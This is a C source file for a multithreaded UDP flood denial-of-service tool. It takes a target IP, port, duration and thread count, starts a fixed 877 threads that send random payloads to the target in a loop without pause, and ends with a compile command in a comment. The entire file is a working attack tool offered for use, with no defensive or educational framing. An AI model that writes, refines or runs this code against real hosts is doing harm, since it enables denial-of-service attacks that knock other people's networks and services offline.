#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h> // For sysconf (though not used for thread count in this version)
#endif

#define PAYLOAD_SIZE 100
#define FIXED_THREAD_COUNT 877 // Define the fixed number of threads

void *attack(void *arg);

void handle_sigint(int sig) {
    printf("\nInterrupt received. Stopping attack...\n");
    exit(0);
}

void usage() {
    // The 'threads' argument is still expected by usage, but its value will be overridden
    printf("Usage: ./s4 ip port time threads\n"); 
    exit(1);
}

struct thread_data {
    char ip[16];
    int port;
    int time_duration; // Renamed from 'time' to avoid conflict
};

// generate_payload function (random ASCII payload)
void generate_payload(char *buffer, size_t size) {
    size_t num_chars_to_generate = size * 4;
    
    for (size_t i = 0; i < num_chars_to_generate; i++) {
        buffer[i] = (rand() % (126 - 32 + 1)) + 32; 
    }
    buffer[num_chars_to_generate] = '\0'; 
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[PAYLOAD_SIZE * 4 + 1];
    // Note: srand() should ideally be called once in main for varied payloads across runs.
    // If not called, rand() sequence is same for all threads/runs.
    generate_payload(payload, PAYLOAD_SIZE); 

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time_duration;

    while (time(NULL) <= endtime) {
        ssize_t payload_len = strlen(payload);
        if (sendto(sock, payload, payload_len, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
        // usleep(1000); // Optional: to prevent overwhelming the local network or CPU.
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) { // Still expects 5 arguments
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time_duration_arg = atoi(argv[3]); // Duration for the attack from command line
    // The threads argument (argv[4]) is parsed but its value is overridden
    // int threads_from_arg = atoi(argv[4]); // Parsed but not used for num_threads_to_launch

    int num_threads_to_launch = FIXED_THREAD_COUNT; // Explicitly set thread count

    // Seed random number generator once (optional, but good for varied payloads across runs)
    // srand(time(NULL)); // Uncomment if you want different payloads each time program runs.

    signal(SIGINT, handle_sigint);

    pthread_t *thread_ids = malloc(num_threads_to_launch * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("malloc for thread_ids failed");
        exit(1);
    }
    struct thread_data *thread_data_array = malloc(num_threads_to_launch * sizeof(struct thread_data));
    if (thread_data_array == NULL) {
        perror("malloc for thread_data_array failed");
        free(thread_ids);
        exit(1);
    }

    printf("Attack started on %s:%d for %d seconds with %d threads (fixed count)\n", 
           ip, port, time_duration_arg, num_threads_to_launch);

    for (int i = 0; i < num_threads_to_launch; i++) {
        strncpy(thread_data_array[i].ip, ip, 15); // Copy up to 15 chars
        thread_data_array[i].ip[15] = '\0';      // Ensure null termination
        thread_data_array[i].port = port;
        thread_data_array[i].time_duration = time_duration_arg;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
            // If many threads, this error might occur due to system limits (e.g., max user processes/threads)
            fprintf(stderr, "Thread creation failed for thread %d. System limits might be reached.\n", i + 1);
            perror("pthread_create");
            // Simple exit here; more robust would be to join successfully created threads and then exit.
            // For now, sticking to simpler error handling.
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }
        // Minimal output to avoid clutter if many threads
        if ((i + 1) % 100 == 0 || i == num_threads_to_launch -1 ) { // Print status periodically
             printf("Launched thread %d / %d\n", i + 1, num_threads_to_launch);
        }
    }
    printf("All %d threads launched.\n", num_threads_to_launch);

    for (int i = 0; i < num_threads_to_launch; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    free(thread_data_array);
    printf("Attack finished\n");
    return 0;
}

//     gcc -o ts4 s4.c -pthread